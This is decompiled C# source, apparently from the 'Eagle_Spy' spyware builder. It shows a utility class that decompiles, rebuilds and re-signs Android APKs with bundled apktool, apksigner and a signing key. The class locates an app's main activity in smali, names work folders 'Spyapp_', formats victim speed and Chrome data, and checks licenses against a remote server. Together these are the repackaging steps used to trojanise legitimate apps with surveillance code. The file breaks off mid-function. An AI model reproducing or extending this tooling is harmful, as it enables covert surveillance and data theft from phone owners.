using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using System.Windows.Forms;
using System.Xml;
using Eagle_Spy.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Newtonsoft.Json.Linq;

namespace Eagle_Spy
{
	// Token: 0x02000032 RID: 50
	[StandardModule]
	internal sealed class Codes
	{
		// Token: 0x06000396 RID: 918 RVA: 0x0005133C File Offset: 0x0004F53C
		public static bool IsValidPackageName(string packageName)
		{
			if (string.IsNullOrWhiteSpace(packageName))
			{
				return false;
			}
			if (!char.IsLetter(packageName[0]))
			{
				return false;
			}
			Regex regex = new Regex("^[a-zA-Z0-9.]+$");
			return regex.IsMatch(packageName) && packageName.Contains(".") && (!packageName.StartsWith(".") && !packageName.EndsWith("."));
		}

		// Token: 0x06000397 RID: 919 RVA: 0x000513A8 File Offset: 0x0004F5A8
		public static bool CheckPort(int Port)
		{
			IPGlobalProperties ipglobalProperties = IPGlobalProperties.GetIPGlobalProperties();
			IPEndPoint[] activeTcpListeners = ipglobalProperties.GetActiveTcpListeners();
			IPEndPoint[] array = activeTcpListeners;
			foreach (IPEndPoint ipendPoint in array)
			{
				if (ipendPoint.Port == Port)
				{
					return false;
				}
			}
			return true;
		}

		// Token: 0x06000398 RID: 920 RVA: 0x000513EC File Offset: 0x0004F5EC
		public static string ServerMessage(string url, bool ispost = false, string postParams = "")
		{
			try
			{
				WebRequest webRequest = WebRequest.Create(url);
				webRequest.Method = "GET";
				if (ispost)
				{
					webRequest.Method = "POST";
					byte[] bytes = global::System.Text.Encoding.UTF8.GetBytes(postParams);
					webRequest.ContentType = "application/x-www-form-urlencoded";
					webRequest.ContentLength = (long)bytes.Length;
					using (Stream requestStream = webRequest.GetRequestStream())
					{
						requestStream.Write(bytes, 0, bytes.Length);
					}
				}
				WebResponse response = webRequest.GetResponse();
				using (Stream responseStream = response.GetResponseStream())
				{
					using (StreamReader streamReader = new StreamReader(responseStream))
					{
						return streamReader.ReadToEnd();
					}
				}
			}
			catch (Exception)
			{
			}
			return "Error";
		}

		// Token: 0x06000399 RID: 921 RVA: 0x000514D4 File Offset: 0x0004F6D4
		public static string ReadConfig(string childName)
		{
			try
			{
				string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
				string text = File.ReadAllText(baseDirectory + "\\Config.json");
				JObject jobject = JObject.Parse(Codes.AES_Decrypt(text, "q}%h%anHhw;sW.u*$eX{W]EYCHo9m8PxK;"));
				JToken jtoken = jobject["Cloud"];
				JToken jtoken2 = jtoken[childName];
				return jtoken2.ToString();
			}
			catch (Exception)
			{
			}
			return "null";
		}

		// Token: 0x0600039A RID: 922 RVA: 0x000030FF File Offset: 0x000012FF
		public static int nearstmulti(int v, int n)
		{
			checked
			{
				return (int)Math.Round(unchecked(Math.Round((double)v / (double)n) * (double)n));
			}
		}

		// Token: 0x0600039B RID: 923 RVA: 0x0005154C File Offset: 0x0004F74C
		public static Bitmap ReadBitmapFromFile(string s_Path)
		{
			Bitmap bitmap2;
			try
			{
				using (FileStream fileStream = new FileStream(s_Path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
				{
					using (Bitmap bitmap = new Bitmap(fileStream))
					{
						bitmap2 = new Bitmap(bitmap);
					}
				}
			}
			catch (Exception)
			{
				bitmap2 = new Bitmap(4, 4);
			}
			return bitmap2;
		}

		// Token: 0x0600039C RID: 924 RVA: 0x000515BC File Offset: 0x0004F7BC
		public static string GetDriv()
		{
			string text;
			try
			{
				string[] array = new string[] { "\\" };
				string[] array2 = Application.StartupPath.Split(array, StringSplitOptions.RemoveEmptyEntries);
				text = array2[0].ToString() + "\\";
			}
			catch (Exception)
			{
				text = "C:\\";
			}
			return text;
		}

		// Token: 0x0600039D RID: 925 RVA: 0x00051614 File Offset: 0x0004F814
		public static string hashmd5(string file_name)
		{
			byte[] array;
			using (MD5 md = MD5.Create())
			{
				using (FileStream fileStream = File.OpenRead(file_name))
				{
					fileStream.Position = 0L;
					array = md.ComputeHash(fileStream);
				}
			}
			object objectValue = RuntimeHelpers.GetObjectValue(Codes.ComputeHash(array));
			return Conversions.ToString(objectValue);
		}

		// Token: 0x0600039E RID: 926 RVA: 0x00051684 File Offset: 0x0004F884
		public static string FindActivityInSmali(string TheApkPath, string activityName, string smaliFolderPath)
		{
			string text = activityName.Replace('.', '/');
			string text2 = string.Concat(new string[] { TheApkPath, "/", smaliFolderPath, "/", text, ".smali" });
			if (File.Exists(text2))
			{
				return text2;
			}
			return "pass";
		}

		// Token: 0x0600039F RID: 927 RVA: 0x000516DC File Offset: 0x0004F8DC
		public static bool FileInUse(string sFile)
		{
			bool flag = false;
			if (File.Exists(sFile))
			{
				try
				{
					using (new FileStream(sFile, FileMode.Open, FileAccess.ReadWrite, FileShare.None))
					{
					}
				}
				catch (Exception)
				{
					flag = true;
				}
			}
			return flag;
		}

		// Token: 0x060003A0 RID: 928 RVA: 0x00051730 File Offset: 0x0004F930
		public static List<string> GetActivityNames(string manifestPath, bool OnlyMain)
		{
			List<string> list = new List<string>();
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.Load(manifestPath);
			XmlNamespaceManager xmlNamespaceManager = new XmlNamespaceManager(xmlDocument.NameTable);
			xmlNamespaceManager.AddNamespace("android", "http://schemas.android.com/apk/res/android");
			XmlNodeList xmlNodeList = xmlDocument.SelectNodes("//manifest/application/activity[intent-filter/action/@android:name='android.intent.action.MAIN']/@android:name", xmlNamespaceManager);
			foreach (object obj in xmlNodeList)
			{
				XmlNode xmlNode = (XmlNode)obj;
				Console.WriteLine(xmlNode.Value);
				list.Add(xmlNode.Value);
			}
			if (OnlyMain)
			{
				if (list.Count > 0)
				{
					return list;
				}
				Interaction.MsgBox("Detecting Main Activities Failed , Searching for other Activitys...", MsgBoxStyle.OkOnly, null);
			}
			XmlNodeList xmlNodeList2 = xmlDocument.SelectNodes("//manifest/application/activity/@android:name", xmlNamespaceManager);
			foreach (object obj2 in xmlNodeList2)
			{
				XmlNode xmlNode2 = (XmlNode)obj2;
				list.Add(xmlNode2.Value);
			}
			if (list.Count > 0)
			{
				return list;
			}
			Interaction.MsgBox("Failed to find Activities...", MsgBoxStyle.OkOnly, null);
			return null;
		}

		// Token: 0x060003A1 RID: 929 RVA: 0x00051870 File Offset: 0x0004FA70
		public static object ComputeHash(byte[] array)
		{
			string text = "";
			checked
			{
				int num = array.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					text += array[i].ToString("X2");
				}
				return text.ToLower();
			}
		}

		// Token: 0x060003A2 RID: 930
		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		// Token: 0x060003A3 RID: 931
		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		// Token: 0x060003A4 RID: 932 RVA: 0x000518B4 File Offset: 0x0004FAB4
		public static Image Base64ToImage(string base64string)
		{
			string text = base64string.Replace(" ", "+");
			byte[] array = Convert.FromBase64String(text);
			MemoryStream memoryStream = new MemoryStream(array);
			Image image = Image.FromStream(memoryStream);
			memoryStream.Dispose();
			return image;
		}

		// Token: 0x060003A5 RID: 933 RVA: 0x000518F0 File Offset: 0x0004FAF0
		public static string ProcessJson(string chromeJson)
		{
			return chromeJson.Replace("}", "").Replace("]", "").Replace("[", "")
				.Replace("\"", " ")
				.Replace("{", "\r\n")
				.Replace(",", "\r\n");
		}

		// Token: 0x060003A6 RID: 934 RVA: 0x00051958 File Offset: 0x0004FB58
		public static object inializeReg()
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			string text = "Software\\\\DataConfigrations";
			RegistryKey registryKey2 = registryKey.OpenSubKey(text, true);
			try
			{
				if (registryKey2 == null)
				{
					registryKey2 = registryKey.CreateSubKey(text);
				}
				return true;
			}
			catch (Exception)
			{
			}
			return false;
		}

		// Token: 0x060003A7 RID: 935 RVA: 0x000519B4 File Offset: 0x0004FBB4
		public static void GetKeyFromReg(string key)
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			string text = "Software\\\\DataConfigrations";
			RegistryKey registryKey2 = registryKey.OpenSubKey(text, true);
			registryKey2.SetValue("PASSKEY", key);
			registryKey2.Close();
		}

		// Token: 0x060003A8 RID: 936 RVA: 0x000519F4 File Offset: 0x0004FBF4
		public static string getuserkey()
		{
			try
			{
				RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
				string text = "Software\\\\DataConfigrations";
				using (RegistryKey registryKey2 = registryKey.OpenSubKey(text, true))
				{
					object objectValue = RuntimeHelpers.GetObjectValue(registryKey2.GetValue("PASSKEY"));
					if (objectValue != null)
					{
						return registryKey2.GetValue("PASSKEY").ToString();
					}
				}
			}
			catch (Exception)
			{
			}
			return "";
		}

		// Token: 0x060003A9 RID: 937 RVA: 0x00003114 File Offset: 0x00001314
		public static Encoding Encoding()
		{
			return global::System.Text.Encoding.UTF8;
		}

		// Token: 0x060003AA RID: 938 RVA: 0x00051A80 File Offset: 0x0004FC80
		public static Image ChangeImageOpacity(Bitmap originalImage)
		{
			float num = 50f;
			float num2 = 1f;
			float num3 = 0f;
			float[][] array = new float[5][];
			int num4 = 0;
			float[] array2 = new float[5];
			array2[0] = num;
			array[num4] = array2;
			int num5 = 1;
			float[] array3 = new float[5];
			array3[1] = num;
			array[num5] = array3;
			int num6 = 2;
			float[] array4 = new float[5];
			array4[2] = num;
			array[num6] = array4;
			int num7 = 3;
			float[] array5 = new float[5];
			array5[3] = 1f;
			array[num7] = array5;
			array[4] = new float[] { num3, num3, num3, 0f, 1f };
			float[][] array6 = array;
			Codes.imageAttributes.ClearColorMatrix();
			Codes.imageAttributes.SetColorMatrix(new ColorMatrix(array6), ColorMatrixFlag.Default, ColorAdjustType.Bitmap);
			Codes.imageAttributes.SetGamma(num2, ColorAdjustType.Bitmap);
			Graphics graphics = Graphics.FromImage(originalImage);
			graphics.DrawImage(originalImage, new Rectangle(0, 0, originalImage.Width, originalImage.Height), 0, 0, originalImage.Width, originalImage.Height, GraphicsUnit.Pixel, Codes.imageAttributes);
			return originalImage;
		}

		// Token: 0x060003AB RID: 939 RVA: 0x00051B5C File Offset: 0x0004FD5C
		public static string GenerateRandomFolderName(string nam)
		{
			Codes._Closure_0024__26_002D0 closure_0024__26_002D = null;
			Codes._Closure_0024__26_002D0 CS_0024_003C_003E8__locals0 = new Codes._Closure_0024__26_002D0(closure_0024__26_002D);
			string tempPath = Path.GetTempPath();
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
			int num = 10;
			CS_0024_003C_003E8__locals0._0024VB_0024Local_random = new Random();
			string text2 = "Spyapp_" + nam + "_" + new string((from s in Enumerable.Repeat<string>(text, 10)
				select s[CS_0024_003C_003E8__locals0._0024VB_0024Local_random.Next(s.Length)]).ToArray<char>());
			string text3 = Path.Combine(tempPath, text2);
			string driv = Codes.GetDriv();
			while (Directory.Exists(text3))
			{
				text2 = string.Concat(new string[]
				{
					driv,
					"Spyapp_",
					nam,
					"_",
					new string((from s in Enumerable.Repeat<string>(text, num)
						select s[CS_0024_003C_003E8__locals0._0024VB_0024Local_random.Next(s.Length)]).ToArray<char>())
				});
				text3 = Path.Combine(tempPath, text2);
			}
			Directory.CreateDirectory(text3);
			return text3;
		}

		// Token: 0x060003AC RID: 940 RVA: 0x00051C50 File Offset: 0x0004FE50
		public static void DirectoryDeleteLong(string directoryPath)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Path.GetTempPath() + "\\TempEmptyDirectory-" + Guid.NewGuid().ToString());
			try
			{
				directoryInfo.Create();
				using (Process process = new Process())
				{
					process.StartInfo.FileName = "robocopy.exe";
					process.StartInfo.Arguments = string.Concat(new string[] { "\"", directoryInfo.FullName, "\" \"", directoryPath, "\" /mir /r:1 /w:1 /np /xj /sl" });
					process.StartInfo.UseShellExecute = false;
					process.StartInfo.CreateNoWindow = true;
					process.Start();
					process.WaitForExit();
				}
				directoryInfo.Delete();
				if (Directory.Exists(directoryPath))
				{
					DirectoryInfo directoryInfo2 = new DirectoryInfo(directoryPath);
					directoryInfo2.Attributes = FileAttributes.Normal;
					Directory.Delete(directoryPath);
				}
			}
			catch (IOException)
			{
			}
		}

		// Token: 0x060003AD RID: 941
		[DllImport("user32.dll")]
		public static extern uint SetWindowDisplayAffinity(IntPtr hWnd, uint dwAffinity);

		// Token: 0x060003AE RID: 942 RVA: 0x00051D54 File Offset: 0x0004FF54
		public static string GetSpeed(string speed)
		{
			int num = checked((int)Math.Round((double)(Conversions.ToInteger(speed) * 3600) / 1000.0));
			return string.Format("{0} km/h", num);
		}

		// Token: 0x060003AF RID: 943 RVA: 0x00051D90 File Offset: 0x0004FF90
		public static string Duration(int Time)
		{
			int num = Time % 60;
			checked
			{
				int num2 = (int)Math.Round((double)(Time - num) / 60.0 % 60.0);
				int num3 = (int)Math.Round((double)(Time - (num + num2 * 60)) / 3600.0 % 60.0);
				return string.Concat(new string[]
				{
					Strings.Format(num3, "00"),
					":",
					Strings.Format(num2, "00"),
					":",
					Strings.Format(num, "00").ToString()
				});
			}
		}

		// Token: 0x060003B0 RID: 944 RVA: 0x00051E40 File Offset: 0x00050040
		public static string ToTime(long Value)
		{
			long num = Value / 3600L;
			checked
			{
				long num2 = (Value - num * 3600L) / 60L;
				long num3 = Value - (num * 3600L + num2 * 60L);
				return string.Concat(new string[]
				{
					Conversions.ToString(num),
					":",
					Conversions.ToString(num2),
					":",
					Conversions.ToString(num3)
				});
			}
		}

		// Token: 0x060003B1 RID: 945 RVA: 0x00051EB0 File Offset: 0x000500B0
		public static byte[] CGzip(byte[] b)
		{
			byte[] array;
			try
			{
				using (MemoryStream memoryStream = new MemoryStream())
				{
					if (memoryStream.CanSeek)
					{
						memoryStream.Seek(0L, SeekOrigin.Begin);
					}
					using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress, true))
					{
						gzipStream.Write(b, 0, b.Length);
					}
					array = memoryStream.ToArray();
				}
			}
			catch (Exception)
			{
				array = null;
			}
			return array;
		}

		// Token: 0x060003B2 RID: 946 RVA: 0x0000311B File Offset: 0x0000131B
		private static bool IsCompressedGZip(byte[] data)
		{
			return data.Length >= 2 && data[0] == 31 && data[1] == 139;
		}

		// Token: 0x060003B3 RID: 947 RVA: 0x00051F38 File Offset: 0x00050138
		public static byte[] DEgzip(ref byte[] b)
		{
			try
			{
				if (Codes.IsCompressedGZip(b))
				{
					using (MemoryStream memoryStream = new MemoryStream())
					{
						using (MemoryStream memoryStream2 = new MemoryStream(b))
						{
							if (memoryStream2.CanSeek)
							{
								memoryStream2.Seek(0L, SeekOrigin.Begin);
							}
							using (GZipStream gzipStream = new GZipStream(memoryStream2, CompressionMode.Decompress))
							{
								Codes.CopyStreamToStream(gzipStream, memoryStream);
							}
							return memoryStream.ToArray();
						}
					}
				}
				return null;
			}
			catch (Exception)
			{
			}
			return null;
		}

		// Token: 0x060003B4 RID: 948 RVA: 0x00051FE4 File Offset: 0x000501E4
		public static void CopyStreamToStream(Stream input, Stream output)
		{
			try
			{
				byte[] array = new byte[16384];
				int num;
				do
				{
					num = input.Read(array, 0, array.Length);
					output.Write(array, 0, num);
				}
				while (num != 0);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060003B5 RID: 949 RVA: 0x00003138 File Offset: 0x00001338
		private static T InlineAssignHelper<T>(ref T target, T value)
		{
			target = value;
			return value;
		}

		// Token: 0x060003B6 RID: 950 RVA: 0x0005202C File Offset: 0x0005022C
		public static object BSEN(string Str)
		{
			byte[] bytes = global::System.Text.Encoding.UTF8.GetBytes(Str);
			return Convert.ToBase64String(bytes);
		}

		// Token: 0x060003B7 RID: 951 RVA: 0x0005204C File Offset: 0x0005024C
		public static Image BlankImage()
		{
			Image image;
			try
			{
				Bitmap bitmap = new Bitmap(1, 1);
				bitmap.SetPixel(0, 0, Color.Transparent);
				image = bitmap;
			}
			catch (Exception)
			{
				image = null;
			}
			return image;
		}

		// Token: 0x060003B8 RID: 952 RVA: 0x00052088 File Offset: 0x00050288
		public static string Translate(string inputtext, string fromlangid, string tolangid)
		{
			try
			{
				inputtext = HttpUtility.HtmlAttributeEncode(inputtext.Replace("\r\n", "[]"));
				string text = new WebClient
				{
					Encoding = global::System.Text.Encoding.UTF8
				}.DownloadString(string.Concat(new string[] { "https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=", tolangid, "&hl=", fromlangid, "&dt=t&dt=bd&dj=1&source=icon&q=", inputtext }));
				JObject jobject = JObject.Parse(text);
				string text2 = jobject.SelectToken("sentences[0]").SelectToken("trans").ToString();
				return text2.Replace("[]", "\r\n");
			}
			catch (Exception)
			{
			}
			return inputtext.Replace("[]", "\r\n");
		}

		// Token: 0x060003B9 RID: 953 RVA: 0x00052150 File Offset: 0x00050350
		public static bool MyMsgBox(string title, string msg, bool useno, Bitmap ico)
		{
			try
			{
				string text = msg;
				string language = RegistryHandler.Get_Language();
				if (Operators.CompareString(language, "CN", false) != 0)
				{
					if (Operators.CompareString(language, "AR", false) == 0)
					{
						text = Codes.Translate(text, "en", "ar");
					}
				}
				else
				{
					text = Codes.Translate(text, "en", "zh");
				}
				EagleSpyMsgbox eagleSpyMsgbox = new EagleSpyMsgbox(title.Replace("  ", "\r\n"), text, useno, ico);
				if (eagleSpyMsgbox.ShowDialog() == DialogResult.Yes)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
			return false;
		}

		// Token: 0x060003BA RID: 954 RVA: 0x000521E4 File Offset: 0x000503E4
		public static string CheckForUpdates()
		{
			try
			{
				return Codes.ServerMessage(Codes.ReadConfig("CHECK_UPDATE"), true, string.Concat(new string[]
				{
					"api=S0tMeD0WoUQyO8wuButveJYoBlONhU5riAKBPn6R&email=",
					RegistryHandler.Get_EMAIL(),
					"&password=",
					Codes.getuserkey(),
					"&HWID=",
					(Codes.GetHWID() + RegistryHandler.Get_ID_ASSIST()).Trim()
				}));
			}
			catch (Exception)
			{
			}
			return "Error";
		}

		// Token: 0x060003BB RID: 955 RVA: 0x00052268 File Offset: 0x00050468
		public static string Excuteapkeditor_pro(string apkpath)
		{
			string text = reso.res_Path + "\\Lib\\ApkEditor.jar";
			if (!File.Exists(reso.res_Path + "\\"))
			{
				File.WriteAllBytes(text, Resources.APKEditor);
			}
			string text2 = string.Concat(new string[] { "java -jar \"", text, "\" p -i \"", apkpath, "\" && EXIT" });
			Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + text2)
			{
				RedirectStandardOutput = true,
				UseShellExecute = false,
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden
			});
			string text3 = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			return text3;
		}

		// Token: 0x060003BC RID: 956 RVA: 0x00052320 File Offset: 0x00050520
		public static string Excuteapkeditor(string apkpath)
		{
			string text = reso.res_Path + "\\Lib\\ApkEditor.jar";
			if (!File.Exists(text))
			{
				File.WriteAllBytes(text, Resources.APKEditor);
			}
			string text2 = string.Concat(new string[] { "java -jar \"", text, "\" info -i \"", apkpath, "\" && EXIT" });
			Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + text2)
			{
				RedirectStandardOutput = true,
				UseShellExecute = false,
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden
			});
			string text3 = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			return text3;
		}

		// Token: 0x060003BD RID: 957 RVA: 0x000523CC File Offset: 0x000505CC
		public static string ExecuteDecompile(string apkpath, string outdir)
		{
			string text = reso.res_Path + "\\Lib\\apktool.jar";
			if (!File.Exists(text))
			{
				File.WriteAllBytes(text, Resources.apktool);
			}
			string text2 = string.Concat(new string[] { "java -jar \"", text, "\" d -f \"", apkpath, "\" -o \"", outdir, "\" && EXIT" });
			Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + text2)
			{
				RedirectStandardOutput = true,
				UseShellExecute = false,
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden
			});
			string text3 = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			return text3;
		}

		// Token: 0x060003BE RID: 958 RVA: 0x00052484 File Offset: 0x00050684
		public static string ExecuteSign(string apkpath, string outfilepath)
		{
			string text = reso.res_Path + "\\Lib\\apksigner.jar";
			string text2 = reso.res_Path + "\\Lib\\key.pk8";
			string text3 = reso.res_Path + "\\Lib\\certificate.pem";
			File.WriteAllBytes(text3, Resources.c);
			File.WriteAllBytes(text2, Resources.k);
			if (!File.Exists(text))
			{
				File.WriteAllBytes(text, Resources.apktool);
			}
			string text4 = string.Concat(new string[]
			{
				"java -jar \"", text, "\" sign --key \"", text2, "\" --cert \"", text3, "\" --v2-signing-enabled true --v3-signing-enabled true --out \"", outfilepath, "\" \"", apkpath,
				"\" && EXIT"
			});
			Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + text4)
			{
				RedirectStandardOutput = true,
				UseShellExecute = false,
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden
			});
			string text5 = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			return text5;
		}

		// Token: 0x060003BF RID: 959 RVA: 0x00052594 File Offset: 0x00050794
		public static string ExecuteCompile(string apkfolderpath, string outfilepath)
		{
			string text = reso.res_Path + "\\Lib\\apktool.jar";
			if (!File.Exists(text))
			{
				File.WriteAllBytes(text, Resources.apktool);
			}
			string text2 = string.Concat(new string[] { "java -jar \"", text, "\" b -f \"", apkfolderpath, "\" -o \"", outfilepath, "\" && EXIT" });
			Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + text2)
			{
				RedirectStandardOutput = true,
				UseShellExecute = false,
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden
			});
			string text3 = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			return text3;
		}

		// Token: 0x060003C0 RID: 960 RVA: 0x00052594 File Offset: 0x00050794
		public static string ExecuteExtractApk(string apkfolderpath, string outfilepath)
		{
			string text = reso.res_Path + "\\Lib\\apktool.jar";
			if (!File.Exists(text))
			{
				File.WriteAllBytes(text, Resources.apktool);
			}
			string text2 = string.Concat(new string[] { "java -jar \"", text, "\" b -f \"", apkfolderpath, "\" -o \"", outfilepath, "\" && EXIT" });
			Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + text2)
			{
				RedirectStandardOutput = true,
				UseShellExecute = false,
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden
			});
			string text3 = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			return text3;
		}

		// Token: 0x060003C1 RID: 961 RVA: 0x0005264C File Offset: 0x0005084C
		public static object RegexMatcher(string text, string match)
		{
			Regex regex = new Regex(text);
			Match match2 = regex.Match(match);
			return match2.ToString();
		}

		// Token: 0x060003C2 RID: 962 RVA: 0x00052670 File Offset: 0x00050870
		public static string GetAndroidVersionName(string sdkNumber)
		{
			int num = 0;
			if (int.TryParse(sdkNumber, out num))
			{
				switch (num)
				{
				case 16:
					return "Android 4.1 (Jelly Bean)";
				case 17:
					return "Android 4.2 (Jelly Bean)";
				case 18:
					return "Android 4.3 (Jelly Bean)";
				case 19:
					return "Android 4.4 (KitKat)";
				case 21:
					return "Android 5.0 (Lollipop)";
				case 22:
					return "Android 5.1 (Lollipop)";
				case 23:
					return "Android 6.0 (Marshmallow)";
				case 24:
					return "Android 7.0 (Nougat)";
				case 25:
					return "Android 7.1 (Nougat)";
				case 26:
					return "Android 8.0 (Oreo)";
				case 27:
					return "Android 8.1 (Oreo)";
				case 28:
					return "Android 9 (Pie)";
				case 29:
					return "Android 10";
				case 30:
					return "Android 11";
				case 31:
					return "Android 12";
				case 32:
					return "Android 13";
				case 33:
					return "Android 14";
				}
				return "null";
			}
			return "null";
		}

		// Token: 0x060003C3 RID: 963 RVA: 0x0005277C File Offset: 0x0005097C
		public static string ProcessStartWithOutput(string FileName, string Arguments, int waitfor = 5000)
		{
			string text = string.Empty;
			try
			{
				using (Process process = new Process())
				{
					process.StartInfo.FileName = FileName;
					process.StartInfo.Arguments = Arguments;
					process.StartInfo.CreateNoWindow = true;
					process.StartInfo.RedirectStandardOutput = true;
					process.StartInfo.RedirectStandardError = true;
					process.StartInfo.UseShellExecute = false;
					process.Start();
					text = process.StandardOutput.ReadToEnd().Trim() + process.StandardError.ReadToEnd().Trim();
					if (waitfor == 0)
					{
						process.WaitForExit();
					}
					else
					{
						process.WaitForExit(waitfor);
					}
				}
			}
			catch (Exception ex)
			{
				Exception ex2 = ex;
				Debug.WriteLine(ex2);
			}
			Debug.WriteLine(text);
			return text;
		}

		// Token: 0x060003C4 RID: 964 RVA: 0x00003142 File Offset: 0x00001342
		public static string RealPath(string path = "")
		{
			return Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + path;
		}

		// Token: 0x060003C5 RID: 965 RVA: 0x00052860 File Offset: 0x00050A60
		public static string ExtractName(string apkpath)
		{
			string text = "AppName=\"([^\"]+)\"";
			Match match = Regex.Match(Codes.Excuteapkeditor(apkpath), text);
			if (match.Success)
			{
				return match.Groups[1].Value;
			}
			return "";
		}

		// Token: 0x060003C6 RID: 966 RVA: 0x000528A0 File Offset: 0x00050AA0
		public static string ExtractPackage(string apkpath)
		{
			string text = "package=\"([^\"]+)\"";
			Match match = Regex.Match(Codes.Excuteapkeditor(apkpath), text);
			if (match.Success)
			{
				return match.Groups[1].Value;
			}
			return "";
		}

		// Token: 0x060003C7 RID: 967 RVA: 0x000528E0 File Offset: 0x00050AE0
		public static string WhatNewupdate()
		{
			try
			{
				string text = Codes.ServerMessage(Codes.ReadConfig("WhatNew"), true, string.Concat(new string[]
				{
					"api=5XqtqjEv1eYwPeZAde1u9yWlu&email=",
					RegistryHandler.Get_EMAIL(),
					"&password=",
					Codes.getuserkey(),
					"&HWID=",
					(Codes.GetHWID() + RegistryHandler.Get_ID_ASSIST()).Trim()
				}));
				if (text.StartsWith("update"))
				{
					return text.Replace("[nl]", "\r\n");
				}
				return "ERROR";
			}
			catch (Exception)
			{
			}
			return "ERROR";
		}

		// Token: 0x060003C8 RID: 968 RVA: 0x00003159 File Offset: 0x00001359
		public static void File_zip_Decompress(string zipPath, string pathfolder)
		{
			if (!Directory.Exists(pathfolder))
			{
				Directory.CreateDirectory(pathfolder);
			}
			ZipFile.ExtractToDirectory(zipPath, pathfolder);
		}

		// Token: 0x060003C9 RID: 969 RVA: 0x0005298C File Offset: 0x00050B8C
		public static Image ResizeImage(Image inputImage, Size size, bool preserveAspectRatio = false)
		{
			if (inputImage.Width == size.Width && inputImage.Height == size.Height)
			{
				return inputImage;
			}
			int num = size.Width;
			int num2 = size.Height;
			checked
			{
				if (preserveAspectRatio)
				{
					int width = inputImage.Width;
					int height = inputImage.Height;
					float num3 = (float)Math.Min((double)size.Width / (double)width, (double)size.Height / (double)height);
					num = (int)Math.Round((double)(unchecked((float)width * num3)));
					num2 = (int)Math.Round((double)(unchecked((float)height * num3)));
				}
				Bitmap bitmap = new Bitmap(num, num2);
				using (Graphics graphics = Graphics.FromImage(bitmap))
				{
					graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
					graphics.DrawImage(inputImage, 0, 0, num, num2);
				}
				return bitmap;
			}
		}

		// Token: 0x060003CA RID: 970 RVA: 0x00052A58 File Offset: 0x00050C58
		public static string GetHWID()
		{
			string text = null;
			try
			{
				StringBuilder stringBuilder = new StringBuilder();
				try
				{
					string text2 = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
					ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + text2 + ":\"");
					managementObject.Get();
					stringBuilder.Append(managementObject["VolumeSerialNumber"].ToString());
				}
				catch (Exception)
				{
					stringBuilder.Append("VSVALID");
				}
				SelectQuery selectQuery = new SelectQuery("Win32_BaseBoard");
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(selectQuery);
				try
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						ManagementObject managementObject2 = (ManagementObject)managementBaseObject;
						stringBuilder.Append(managementObject2["SerialNumber"].ToString());
					}
				}
				catch (Exception)
				{
					stringBuilder.Append("SNVALID");
				}
				try
				{
					selectQuery = new SelectQuery("Win32_processor");
					managementObjectSearcher = new ManagementObjectSearcher(selectQuery);
					foreach (ManagementBaseObject managementBaseObject2 in managementObjectSearcher.Get())
					{
						ManagementObject managementObject3 = (ManagementObject)managementBaseObject2;
						stringBuilder.Append(managementObject3["processorId"].ToString());
					}
				}
				catch (Exception)
				{
					stringBuilder.Append("PIVALID");
				}
				text = stringBuilder.ToString().Trim().Replace("+", "_");
				return text;
			}
			catch (Exception)
			{
				Interaction.MsgBox("Error Generate ID", MsgBoxStyle.OkOnly, null);
				Environment.FailFast("Error Generate ID");
			}
			return text;
		}

		// Token: 0x060003CB RID: 971 RVA: 0x00052C78 File Offset: 0x00050E78
		public static object[] SplitByte(byte[] b, Array s)
		{
			object[] array = new object[2];
			MemoryStream memoryStream = new MemoryStream();
			long num = (long)s.GetValue(0);
			checked
			{
				memoryStream.Write(b, 0, (int)num);
				byte[] array2 = memoryStream.ToArray();
				array[0] = Codes.DEgzip(ref array2);
